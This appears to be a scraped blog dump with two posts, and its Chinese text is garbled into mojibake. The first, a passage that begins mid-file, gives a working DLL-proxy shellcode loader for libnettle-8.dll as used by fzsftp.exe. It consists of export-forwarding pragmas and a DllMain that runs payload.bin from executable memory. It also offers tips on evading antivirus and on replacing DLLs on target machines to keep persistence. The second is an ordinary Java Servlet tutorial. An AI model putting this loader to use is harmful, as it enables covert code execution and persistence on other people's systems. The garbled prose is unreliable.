&quot;/export:nettle_sha1_update=tmp2BF5.nettle_sha1_update,@391&quot;)#pragma comment(linker, &quot;/export:nettle_sha224=tmp2BF5.nettle_sha224,@392&quot;)#pragma comment(linker, &quot;/export:nettle_sha224_digest=tmp2BF5.nettle_sha224_digest,@393&quot;)#pragma comment(linker, &quot;/export:nettle_sha224_init=tmp2BF5.nettle_sha224_init,@394&quot;)#pragma comment(linker, &quot;/export:nettle_sha256=tmp2BF5.nettle_sha256,@395&quot;)#pragma comment(linker, &quot;/export:nettle_sha256_digest=tmp2BF5.nettle_sha256_digest,@396&quot;)#pragma comment(linker, &quot;/export:nettle_sha256_init=tmp2BF5.nettle_sha256_init,@397&quot;)#pragma comment(linker, &quot;/export:nettle_sha256_update=tmp2BF5.nettle_sha256_update,@398&quot;)#pragma comment(linker, &quot;/export:nettle_sha384=tmp2BF5.nettle_sha384,@399&quot;)#pragma comment(linker, &quot;/export:nettle_sha384_digest=tmp2BF5.nettle_sha384_digest,@400&quot;)#pragma comment(linker, &quot;/export:nettle_sha384_init=tmp2BF5.nettle_sha384_init,@401&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_224=tmp2BF5.nettle_sha3_224,@402&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_224_digest=tmp2BF5.nettle_sha3_224_digest,@403&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_224_init=tmp2BF5.nettle_sha3_224_init,@404&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_224_update=tmp2BF5.nettle_sha3_224_update,@405&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256=tmp2BF5.nettle_sha3_256,@406&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256_digest=tmp2BF5.nettle_sha3_256_digest,@407&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256_init=tmp2BF5.nettle_sha3_256_init,@408&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256_shake=tmp2BF5.nettle_sha3_256_shake,@409&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256_update=tmp2BF5.nettle_sha3_256_update,@410&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_384=tmp2BF5.nettle_sha3_384,@411&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_384_digest=tmp2BF5.nettle_sha3_384_digest,@412&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_384_init=tmp2BF5.nettle_sha3_384_init,@413&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_384_update=tmp2BF5.nettle_sha3_384_update,@414&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_512=tmp2BF5.nettle_sha3_512,@415&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_512_digest=tmp2BF5.nettle_sha3_512_digest,@416&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_512_init=tmp2BF5.nettle_sha3_512_init,@417&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_512_update=tmp2BF5.nettle_sha3_512_update,@418&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_permute=tmp2BF5.nettle_sha3_permute,@419&quot;)#pragma comment(linker, &quot;/export:nettle_sha512=tmp2BF5.nettle_sha512,@420&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_224=tmp2BF5.nettle_sha512_224,@421&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_224_digest=tmp2BF5.nettle_sha512_224_digest,@422&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_224_init=tmp2BF5.nettle_sha512_224_init,@423&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_256=tmp2BF5.nettle_sha512_256,@424&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_256_digest=tmp2BF5.nettle_sha512_256_digest,@425&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_256_init=tmp2BF5.nettle_sha512_256_init,@426&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_digest=tmp2BF5.nettle_sha512_digest,@427&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_init=tmp2BF5.nettle_sha512_init,@428&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_update=tmp2BF5.nettle_sha512_update,@429&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes128_decrypt_message=tmp2BF5.nettle_siv_cmac_aes128_decrypt_message,@430&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes128_encrypt_message=tmp2BF5.nettle_siv_cmac_aes128_encrypt_message,@431&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes128_set_key=tmp2BF5.nettle_siv_cmac_aes128_set_key,@432&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes256_decrypt_message=tmp2BF5.nettle_siv_cmac_aes256_decrypt_message,@433&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes256_encrypt_message=tmp2BF5.nettle_siv_cmac_aes256_encrypt_message,@434&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes256_set_key=tmp2BF5.nettle_siv_cmac_aes256_set_key,@435&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_decrypt_message=tmp2BF5.nettle_siv_cmac_decrypt_message,@436&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_encrypt_message=tmp2BF5.nettle_siv_cmac_encrypt_message,@437&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_set_key=tmp2BF5.nettle_siv_cmac_set_key,@438&quot;)#pragma comment(linker, &quot;/export:nettle_twofish128=tmp2BF5.nettle_twofish128,@439&quot;)#pragma comment(linker, &quot;/export:nettle_twofish128_set_key=tmp2BF5.nettle_twofish128_set_key,@440&quot;)#pragma comment(linker, &quot;/export:nettle_twofish192=tmp2BF5.nettle_twofish192,@441&quot;)#pragma comment(linker, &quot;/export:nettle_twofish192_set_key=tmp2BF5.nettle_twofish192_set_key,@442&quot;)#pragma comment(linker, &quot;/export:nettle_twofish256=tmp2BF5.nettle_twofish256,@443&quot;)#pragma comment(linker, &quot;/export:nettle_twofish256_set_key=tmp2BF5.nettle_twofish256_set_key,@444&quot;)#pragma comment(linker, &quot;/export:nettle_twofish_decrypt=tmp2BF5.nettle_twofish_decrypt,@445&quot;)#pragma comment(linker, &quot;/export:nettle_twofish_encrypt=tmp2BF5.nettle_twofish_encrypt,@446&quot;)#pragma comment(linker, &quot;/export:nettle_twofish_set_key=tmp2BF5.nettle_twofish_set_key,@447&quot;)#pragma comment(linker, &quot;/export:nettle_umac128_digest=tmp2BF5.nettle_umac128_digest,@448&quot;)#pragma comment(linker, &quot;/export:nettle_umac128_set_key=tmp2BF5.nettle_umac128_set_key,@449&quot;)#pragma comment(linker, &quot;/export:nettle_umac128_set_nonce=tmp2BF5.nettle_umac128_set_nonce,@450&quot;)#pragma comment(linker, &quot;/export:nettle_umac128_update=tmp2BF5.nettle_umac128_update,@451&quot;)#pragma comment(linker, &quot;/export:nettle_umac32_digest=tmp2BF5.nettle_umac32_digest,@452&quot;)#pragma comment(linker, &quot;/export:nettle_umac32_set_key=tmp2BF5.nettle_umac32_set_key,@453&quot;)#pragma comment(linker, &quot;/export:nettle_umac32_set_nonce=tmp2BF5.nettle_umac32_set_nonce,@454&quot;)#pragma comment(linker, &quot;/export:nettle_umac32_update=tmp2BF5.nettle_umac32_update,@455&quot;)#pragma comment(linker, &quot;/export:nettle_umac64_digest=tmp2BF5.nettle_umac64_digest,@456&quot;)#pragma comment(linker, &quot;/export:nettle_umac64_set_key=tmp2BF5.nettle_umac64_set_key,@457&quot;)#pragma comment(linker, &quot;/export:nettle_umac64_set_nonce=tmp2BF5.nettle_umac64_set_nonce,@458&quot;)#pragma comment(linker, &quot;/export:nettle_umac64_update=tmp2BF5.nettle_umac64_update,@459&quot;)#pragma comment(linker, &quot;/export:nettle_umac96_digest=tmp2BF5.nettle_umac96_digest,@460&quot;)#pragma comment(linker, &quot;/export:nettle_umac96_set_key=tmp2BF5.nettle_umac96_set_key,@461&quot;)#pragma comment(linker, &quot;/export:nettle_umac96_set_nonce=tmp2BF5.nettle_umac96_set_nonce,@462&quot;)#pragma comment(linker, &quot;/export:nettle_umac96_update=tmp2BF5.nettle_umac96_update,@463&quot;)#pragma comment(linker, &quot;/export:nettle_version_major=tmp2BF5.nettle_version_major,@464&quot;)#pragma comment(linker, &quot;/export:nettle_version_minor=tmp2BF5.nettle_version_minor,@465&quot;)#pragma comment(linker, &quot;/export:nettle_xrealloc=tmp2BF5.nettle_xrealloc,@466&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes128_decrypt_message=tmp2BF5.nettle_xts_aes128_decrypt_message,@467&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes128_encrypt_message=tmp2BF5.nettle_xts_aes128_encrypt_message,@468&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes128_set_decrypt_key=tmp2BF5.nettle_xts_aes128_set_decrypt_key,@469&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes128_set_encrypt_key=tmp2BF5.nettle_xts_aes128_set_encrypt_key,@470&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes256_decrypt_message=tmp2BF5.nettle_xts_aes256_decrypt_message,@471&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes256_encrypt_message=tmp2BF5.nettle_xts_aes256_encrypt_message,@472&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes256_set_decrypt_key=tmp2BF5.nettle_xts_aes256_set_decrypt_key,@473&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes256_set_encrypt_key=tmp2BF5.nettle_xts_aes256_set_encrypt_key,@474&quot;)#pragma comment(linker, &quot;/export:nettle_xts_decrypt_message=tmp2BF5.nettle_xts_decrypt_message,@475&quot;)#pragma comment(linker, &quot;/export:nettle_xts_encrypt_message=tmp2BF5.nettle_xts_encrypt_message,@476&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_fast_reseed=tmp2BF5.nettle_yarrow256_fast_reseed,@477&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_init=tmp2BF5.nettle_yarrow256_init,@478&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_is_seeded=tmp2BF5.nettle_yarrow256_is_seeded,@479&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_needed_sources=tmp2BF5.nettle_yarrow256_needed_sources,@480&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_random=tmp2BF5.nettle_yarrow256_random,@481&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_seed=tmp2BF5.nettle_yarrow256_seed,@482&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_slow_reseed=tmp2BF5.nettle_yarrow256_slow_reseed,@483&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow256_update=tmp2BF5.nettle_yarrow256_update,@484&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow_key_event_estimate=tmp2BF5.nettle_yarrow_key_event_estimate,@485&quot;)#pragma comment(linker, &quot;/export:nettle_yarrow_key_event_init=tmp2BF5.nettle_yarrow_key_event_init,@486&quot;)DWORD WINAPI DoMagic(LPVOID lpParameter){ //https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer FILE* fp; size_t size; unsigned char* buffer; fp = fopen(&quot;payload.bin&quot;, &quot;rb&quot;); fseek(fp, 0, SEEK_END); size = ftell(fp); fseek(fp, 0, SEEK_SET); buffer = (unsigned char*)malloc(size); //https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources fread(buffer, size, 1, fp); void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, buffer, size); ((void(*) ())exec)(); return 0;}BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){ HANDLE threadHandle; switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: // https://gist.github.com/securitytube/c956348435cc90b8e1f7 // Create a thread and close the handle as we do not want to use it to wait for it threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL); CloseHandle(threadHandle); case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE;} Domagicå‡½æ•°ä»payload.binä¸­è¯»å–shellcodeï¼Œä¹‹åä½¿ç”¨virtualmallocå’Œmallocå‡½æ•°åˆ†é…ç›¸åº”å¤§å°çš„å†…å­˜ç©ºé—´ï¼Œå†å°†æŒ‡é’ˆæŒ‡å‘å¯¹åº”çš„ç©ºé—´æ‰§è¡Œshellcode 12345678910111213141516171819202122232425DWORD WINAPI DoMagic(LPVOID lpParameter){ //https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer FILE* fp; size_t size; unsigned char* buffer; fp = fopen(&quot;payload.bin&quot;, &quot;rb&quot;); fseek(fp, 0, SEEK_END); size = ftell(fp); fseek(fp, 0, SEEK_SET); buffer = (unsigned char*)malloc(size); //https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources fread(buffer, size, 1, fp); void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, buffer, size); ((void(*) ())exec)(); return 0;} Dllmainå‡½æ•°ä¸ºdllå‡½æ•°çš„å…¥å£ 12345678910111213141516171819202122232425BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){ HANDLE threadHandle; switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: // https://gist.github.com/securitytube/c956348435cc90b8e1f7 // Create a thread and close the handle as we do not want to use it to wait for it threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL); CloseHandle(threadHandle); case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE;} åŸæ–‡ç« çš„åŸç†å¦‚ä¸‹å›¾ Aï¼šfzsftp.exe B:tmp2BF5.dll(æ­£å¸¸çš„libnettle-8.dllæ–‡ä»¶) C:æ¶æ„libnettle-8.dll E:payload.bin å­˜å‚¨shellcode å®é™…æ“ä½œä¸­ç”¨csç›´æ¥ç”Ÿæˆçš„shellcodeå·²ç»è¢«æ€è½¯è¯†åˆ«ï¼Œå› æ­¤å…æ€æ•ˆæœå¾ˆå·®ï¼Œå°†shellcodeåˆ†ç¦»åè¿œç¨‹åŠ è½½å¹¶è¿›è¡ŒåŠ å¯†åæ‰å¯ä»¥å®ç°å…æ€ã€‚åœ¨å®æˆ˜ä¸­å¯ä»¥æ ¹æ®ç›®æ ‡æœºå™¨ä¸Šå®‰è£…çš„è½¯ä»¶ç”Ÿæˆdllæ–‡ä»¶å¹¶æ›¿æ¢ï¼Œå®ç°æƒé™ç»´æŒ å‚è€ƒ https://cloud.tencent.com/developer/article/1739263 https://github.com/Flangvik/SharpDllProxy https://gist.github.com/securitytube/c956348435cc90b8e1f7","link":"/2020/12/06/DLL%E4%BB%A3%E7%90%86%E5%8A%A0%E8%BD%BDshellcode%E5%AE%9E%E8%B7%B5/"},{"title":"Servletå­¦ä¹ ","text":"æ¦‚å¿µServlet 1Java Servletï¼ˆJavaæœåŠ¡å™¨å°ç¨‹åºï¼‰æ˜¯ä¸€ä¸ªåŸºäºJavaæŠ€æœ¯çš„Webç»„ä»¶ï¼Œè¿è¡Œåœ¨æœåŠ¡å™¨ç«¯ï¼Œå®ƒç”±Servletå®¹å™¨æ‰€ç®¡ç†ï¼Œç”¨äºç”ŸæˆåŠ¨æ€çš„å†…å®¹ã€‚ Servletæ˜¯å¹³å°ç‹¬ç«‹çš„Javaç±»ï¼Œç¼–å†™ä¸€ä¸ªServletï¼Œå®é™…ä¸Šå°±æ˜¯æŒ‰ç…§Servletè§„èŒƒç¼–å†™ä¸€ä¸ªJavaç±»ã€‚Servletè¢«ç¼–è¯‘ä¸ºå¹³å°ç‹¬ç«‹ çš„å­—èŠ‚ç ï¼Œå¯ä»¥è¢«åŠ¨æ€åœ°åŠ è½½åˆ°æ”¯æŒJavaæŠ€æœ¯çš„WebæœåŠ¡å™¨ä¸­è¿è¡Œã€‚ Servletå®¹å™¨ 1Servletå®¹å™¨ä¹Ÿå«åšServletå¼•æ“ï¼Œæ˜¯WebæœåŠ¡å™¨æˆ–åº”ç”¨ç¨‹åºæœåŠ¡å™¨çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºåœ¨å‘é€çš„è¯·æ±‚å’Œå“åº”ä¹‹ä¸Šæä¾›ç½‘ç»œæœåŠ¡ï¼Œè§£ç åŸºäº MIMEçš„è¯·æ±‚ï¼Œæ ¼å¼åŒ–åŸºäºMIMEçš„å“åº”ã€‚Servletæ²¡æœ‰mainæ–¹æ³•ï¼Œä¸èƒ½ç‹¬ç«‹è¿è¡Œï¼Œå®ƒå¿…é¡»è¢«éƒ¨ç½²åˆ°Servletå®¹å™¨ä¸­ï¼Œç”±å®¹å™¨æ¥å®ä¾‹åŒ–å’Œè°ƒç”¨ Servletçš„æ–¹æ³•ï¼ˆå¦‚doGet()å’ŒdoPost()ï¼‰ï¼ŒServletå®¹å™¨åœ¨Servletçš„ç”Ÿå‘½å‘¨æœŸå†…åŒ…å®¹å’Œç®¡ç†Servletã€‚åœ¨JSPæŠ€æœ¯ æ¨å‡ºåï¼Œç®¡ç†å’Œè¿è¡ŒServlet/JSPçš„å®¹å™¨ä¹Ÿç§°ä¸ºWebå®¹å™¨ã€‚ Tomcat 1234567Tomcatæ˜¯ä¸€ä¸ªå…è´¹çš„å¼€æ”¾æºä»£ç çš„Servletå®¹å™¨ã€‚TomcatæœåŠ¡å™¨æ¥å—å®¢æˆ·è¯·æ±‚å¹¶åšå‡ºå“åº”çš„è¿‡ç¨‹å¦‚ä¸‹ï¼Œä¸ä¸Šå›¾ç±»ä¼¼ï¼š1ï¼‰å®¢æˆ·ç«¯ï¼ˆé€šå¸¸éƒ½æ˜¯æµè§ˆå™¨ï¼‰è®¿é—®WebæœåŠ¡å™¨ï¼Œå‘é€HTTPè¯·æ±‚ã€‚ 2ï¼‰WebæœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚åï¼Œä¼ é€’ç»™Servletå®¹å™¨ã€‚ 3ï¼‰Servletå®¹å™¨åŠ è½½Servletï¼Œäº§ç”ŸServletå®ä¾‹åï¼Œå‘å…¶ä¼ é€’è¡¨ç¤ºè¯·æ±‚å’Œå“åº”çš„å¯¹è±¡ã€‚ 4ï¼‰Servletå®ä¾‹ä½¿ç”¨è¯·æ±‚å¯¹è±¡å¾—åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚ä¿¡æ¯ï¼Œç„¶åè¿›è¡Œç›¸åº”çš„å¤„ç†ã€‚ 5ï¼‰Servletå®ä¾‹å°†å¤„ç†ç»“æœé€šè¿‡å“åº”å¯¹è±¡å‘é€å›å®¢æˆ·ç«¯ï¼Œå®¹å™¨è´Ÿè´£ç¡®ä¿å“åº”æ­£ç¡®é€å‡ºï¼ŒåŒæ—¶å°†æ§åˆ¶è¿”å›ç»™WebæœåŠ¡å™¨ã€‚ tomcatç›®å½•ç»“æ„123456binï¼Œç”¨äºå­˜æ”¾Tomcatçš„å„ç§é…ç½®æ–‡ä»¶ï¼Œæ¯”å¦‚ï¼Œweb.xmlã€server.xmllibï¼Œç”¨äºå­˜æ”¾TomcatæœåŠ¡å™¨ï¼Œå’Œæ‰€æœ‰Webåº”ç”¨ç¨‹åºéœ€è¦è®¿é—®çš„JARæ–‡ä»¶logsï¼Œç”¨äºå­˜æ”¾Tomcatçš„æ—¥å¿—æ–‡ä»¶tempï¼Œç”¨äºå­˜æ”¾Tomcatè¿è¡Œæ—¶ï¼Œäº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶webappsï¼ŒWebåº”ç”¨ç¨‹åºçš„ä¸»è¦å‘å¸ƒç›®å½•ï¼Œé€šå¸¸å°†è¦å‘å¸ƒçš„åº”ç”¨ç¨‹åºæ”¾åˆ°è¿™ä¸ªç›®å½•ä¸‹workï¼ŒTomcatçš„å·¥ä½œç›®å½•ï¼ŒJSPç¼–è¯‘ç”Ÿæˆçš„Servletæºæ–‡ä»¶ï¼Œå’Œå­—èŠ‚ç æ–‡ä»¶æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹ idea tomcatéƒ¨ç½²è¿‡ç¨‹https://blog.csdn.net/qq_28513801/article/details/92838236 servletä»€ä¹ˆæ˜¯servlet?æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªè¿è¡Œåœ¨webå®¹å™¨(webæœåŠ¡å™¨ä¸­)çš„javaç±»ï¼Œtomcatæ˜¯webå®¹å™¨ä¸­çš„ä¸€ä¸ªã€‚ ä½œç”¨ï¼š 1ç”¨äºå¤„ç†ç”¨æˆ·çš„è¯·æ±‚å¹¶ä½œå‡ºå“åº” servletä¸æ™®é€šçš„javaç¨‹åºçš„åŒºåˆ«ï¼š 12341.æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªjavaç±»2.æ‰€æœ‰çš„servletå¿…é¡»å®ç°æ¥å£ï¼šServlet3.è¿è¡ŒTomcatä¸­ï¼Œwebå®¹å™¨ä¸­4.å¯¹ç”¨æˆ·çš„è¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œå¹¶ä¸”åšå‡ºå“åº” ç¼–å†™æ­¥éª¤ï¼š 1231.åˆ›å»ºä¸€ä¸ªç»§æ‰¿äºHttpServletçš„ç±»ï¼ˆHttpServletå®ç°äº†Servletæ¥å£ï¼‰2.é‡å†™doGetæˆ–doPostæ–¹æ³•ï¼Œåˆ†åˆ«ç”¨æ¥å¤„ç†æµè§ˆå™¨æäº¤çš„getæˆ–postè¯·æ±‚3.é…ç½®webapp/WEB-INF/web.xml æ–‡ä»¶ï¼Œé…ç½®Servlet çš„è®¿é—®åœ°å€ã€‚ é…ç½®Servletå†™å¥½çš„Serlvetä¿å­˜åœ¨srcç›®å½•ä¸­ 1234567891011121314151617package com.example.myServlet;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;public class DemoServlet extends HttpServlet { protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { resp.setContentType(&quot;text/html;charset=utf-8&quot;); PrintWriter writer=resp.getWriter(); writer.println(&quot;&lt;h1 style='color:red'&gt;11111&lt;/h1&gt;&quot;); }} åœ¨WEB-INF/web.xmlä¸­é…ç½®servlet-mappingå’Œservlet-name è®¿é—®æ•ˆæœ servletç”Ÿå‘½å‘¨æœŸä¸€ä¸ªservletåªä¼šåœ¨tomcatå®¹å™¨ä¸­å®ä¾‹åŒ–ä¸€æ¬¡ï¼Œä¸”åªä¼šäº§ç”Ÿä¸€ä¸ªå¯¹è±¡ï¼Œå¸¸é©»å†…å­˜ï¼Œè¦ç­‰åˆ°æœåŠ¡å™¨å…³é—­æ‰ä¼šé”€æ¯ã€‚tomcatå¯¹å®ƒåšäº†å¤šçº¿ç¨‹å¤„ç†ï¼Œè¿™æ ·æ‰èƒ½å®ç°ä¸€ä¸ªå¯¹è±¡å¤šä¸ªè¯·æ±‚ initï¼š 1åˆå§‹åŒ–æ–¹æ³•ï¼Œç”¨æˆ·ç¬¬1æ¬¡è®¿é—®çš„æ—¶å€™ä¼šæ‰§è¡Œ1æ¬¡ service ï¼š 1å¤„ç†æœåŠ¡è¯·æ±‚çš„æ–¹æ³•ï¼Œæ¯æ¬¡è¯·æ±‚éƒ½ä¼šæ‰§è¡Œ destoryï¼š 1é”€æ¯æ–¹æ³•ï¼ŒæœåŠ¡å™¨å…³é—­çš„æ—¶å€™æ‰§è¡Œ1æ¬¡ ç»§æ‰¿Servletç±»å¹¶é‡å†™ä¸‰ä¸ªæ–¹æ³• 123456789101112131415161718192021222324252627282930313233package com.example.myServlet;import javax.servlet.*;import java.io.IOException;public class ServletDemo implements Servlet { @Override public void init(ServletConfig servletConfig) throws ServletException{ System.out.println(&quot;init&quot;); } @Override public ServletConfig getServletConfig(){ return null; } @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException{ System.out.println(&quot;service&quot;); } @Override public String getServletInfo() { return null; } @Override public void destroy(){ System.out.println(&quot;destroy&quot;); }} è®¿é—®é¡µé¢åï¼Œå¯ä»¥çœ‹åˆ°æ‰§è¡Œäº†serviceæ–¹æ³• ServletConfigæ¥å£åœ¨Servletçš„é…ç½®æ–‡ä»¶web.xmlä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªæˆ–å¤šä¸ª&lt;init-param&gt;æ ‡ç­¾ä¸ºservleté…ç½®ä¸€äº›åˆå§‹åŒ–å‚æ•°ã€‚ 1234567891011121314151617&lt;servlet&gt; &lt;servlet-name&gt;mytest&lt;/servlet-name&gt; &lt;servlet-class&gt;com.example.myServlet.ConfigServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;name&lt;/param-name&gt; &lt;param-value&gt;admin&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;password&lt;/param-name&gt; &lt;param-value&gt;123456&lt;/param-value&gt; &lt;/init-param&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;mytest&lt;/servlet-name&gt; &lt;url-pattern&gt;/mytest&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; getInitParameter(â€œå‚æ•°â€) é€šè¿‡å‚æ•°åï¼Œå¾—åˆ°æ–‡ä»¶ä¸­å‚æ•°å€¼ getInitParameterNames() å¾—åˆ°æ‰€æœ‰å‚æ•°åå­— tomcatåœ¨åˆ›å»ºServletå®ä¾‹æ—¶ä¼šè‡ªåŠ¨æŠŠä¸Šé¢çš„åˆå§‹åŒ–å‚æ•°å°è£…å¯¹ServletConfigå¯¹è±¡ä¸­ï¼Œå¹¶åœ¨è°ƒç”¨initæ–¹æ³•æ—¶ï¼ŒæŠŠServletConfigå¯¹è±¡ä¼ é€’ç»™servletã€‚é€šè¿‡ServletConfigå¯¹è±¡å°±å¯ä»¥å¾—åˆ°å½“å‰servletçš„åˆå§‹åŒ–å‚æ•°ä¿¡æ¯ã€‚ 12345678910111213141516171819202122232425262728293031package com.example.myServlet;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;import java.util.Enumeration;public class ConfigServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException{ resp.setContentType(&quot;text/html;charset=utf-8&quot;); PrintWriter writer=resp.getWriter(); String name=getInitParameter(&quot;name&quot;); writer.println(name); Enumeration initParameterNames=getInitParameterNames(); while (initParameterNames.hasMoreElements()){ String element= (String) initParameterNames.nextElement(); String value=getInitParameter(element); writer.println(&quot;å‚æ•°å:&quot;+element+&quot;å€¼:&quot;+value); } }} æˆåŠŸè·å–åˆ°äº†é…ç½®çš„ä¿¡æ¯ HttpServletRequest å¯¹è±¡123456789101112131415161718192021222324package com.example.myServlet;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;public class HttpServletRequestDemo extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException{ response.setContentType((&quot;text/html;charset=utf-8&quot;)); PrintWriter writer=response.getWriter(); writer.println(request.getMethod()); //è¯·æ±‚æ–¹å¼ writer.println(request.getRequestURI()); //è¯·æ±‚URL writer.println(request.getProtocol()); //è¯·æ±‚åè®® writer.println(request.getQueryString()); //æŸ¥è¯¢å­—ç¬¦ writer.println(request.getHeader(&quot;user-agent&quot;)); //è·å–UA }} æ•ˆæœ BeanUtilsBeanUtilsæ˜¯apache commons ç»„ä»¶çš„æˆå‘˜ä¹‹ä¸€ï¼Œç”¨äºç®€åŒ–javaBeanå°è£…æ•°æ®çš„æ“ä½œã€‚ä¹Ÿå°±æ˜¯è¯´å¯ä»¥ç®€åŒ–è·å–å‚æ•°çš„æ–¹å¼ å…ˆå¯¼å…¥åŒ… 123456789101112131415161718192021222324252627282930313233343536373839package com.example.myServlet;import org.apache.commons.beanutils.BeanUtils;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;import java.lang.reflect.InvocationTargetException;import java.util.Map;class User{ private String name; private String sex; private int age;}public class HttpServletRequestDemo extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setContentType((&quot;text/html;charset=utf-8&quot;)); PrintWriter writer = response.getWriter(); Map parameterMap = request.getParameterMap(); User user = new User(); try{ BeanUtils.populate(user,parameterMap); }catch (IllegalAccessException e){ e.printStackTrace(); }catch (InvocationTargetException e){ e.printStackTrace(); } writer.println(user); }} ä½œç”¨åŸŸsevletä¸­çš„è¯·æ±‚ä¼šæ ¹æ®ä½œç”¨åŸŸçš„èŒƒå›´åˆ†ä¸ºè¯·æ±‚åŸŸã€ä¼šè¯åŸŸã€ä¸Šä¸‹æ–‡åŸŸ 123è¯·æ±‚åŸŸï¼šä¸€ä¸ªç”¨æˆ·çš„ä¸€æ¬¡è¯·æ±‚ä¼šè¯åŸŸï¼šä¸€ä¸ªç”¨æˆ·çš„æ‰€æœ‰è¯·æ±‚ä¸Šä¸‹æ–‡åŸŸï¼šæ‰€æœ‰ç”¨æˆ·çš„æ‰€æœ‰è¯·æ±‚ èŒƒå›´å¤§å° 